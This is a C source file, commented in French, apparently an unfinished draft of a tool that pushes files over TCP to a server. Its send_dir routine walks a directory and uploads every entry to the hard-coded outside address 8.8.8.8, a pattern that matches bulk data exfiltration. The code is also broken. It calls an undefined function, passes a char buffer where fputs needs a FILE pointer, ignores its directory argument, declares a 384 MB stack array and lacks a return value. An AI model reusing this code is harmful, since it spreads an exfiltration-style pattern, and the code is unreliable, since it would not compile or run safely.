#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <dirent.h>

//#define SERVER_IP "192.168.1.100"  // IP du serveur
#define SERVER_PORT 9000
#define BUFFER_SIZE 8192

int send_file(const char *filename, const char *SERVER_IP) {
    int sock;
    struct sockaddr_in server_addr;
    FILE *file;
    char buffer[BUFFER_SIZE];

    // Création de la socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Erreur de création de socket");
        return -1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

    // Connexion au serveur
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Erreur de connexion au serveur");
        close(sock);
        return -1;
    }

    // Envoi du nom du fichier
    send(sock, filename, strlen(filename), 0);

    // Ouverture du fichier à envoyer
    file = fopen(filename, "rb");
    if (!file) {
        perror("Erreur d'ouverture du fichier");
        close(sock);
        return -1;
    }

    // Envoi du fichier en chunks
    while (!feof(file)) {
        size_t bytes_read = fread(buffer, 1, BUFFER_SIZE, file);
        send(sock, buffer, bytes_read, 0);
    }

    printf("✅ Fichier %s envoyé avec succès !\n", filename);

    fclose(file);
    close(sock);
    return 0;
}

//int main() {
//    send_file("test_file.txt", "192.168.1.100");  // Remplace avec ton fichier
//    return 0;
//}

void read_file(const char *name, char *output){
    FILE *file = fopen(name, "r");
    char buffer[8192];

    if (!file) {
        perror("Erreur ouverture fichier");
        return;
    }

    while (fgets(buffer, sizeof(buffer), file)){
        fputs(buffer, output);
    }
    fclose(file);

}

int send_dir(const char *dir_path, const char *ip, const char *mod){
    struct dirent *entry;
    DIR *dir = opendir(".");
    char filepath[512];
    long total_size = get_total_size(dir_path);
    char output[total_size + 512];
    char buffer[96000000*4];


    while ((entry = readdir(dir)) != NULL){
        snprintf(filepath, sizeof(filepath), "%s/%s", dir_path , entry->d_name);
        send_file(filepath, "8.8.8.8");
        //read_file(filepath, buffer);
        //fputs(".;/:§!", buffer);
        //fputs(buffer, output);
        //memset(buffer, 0, sizeof(buffer));
    }

}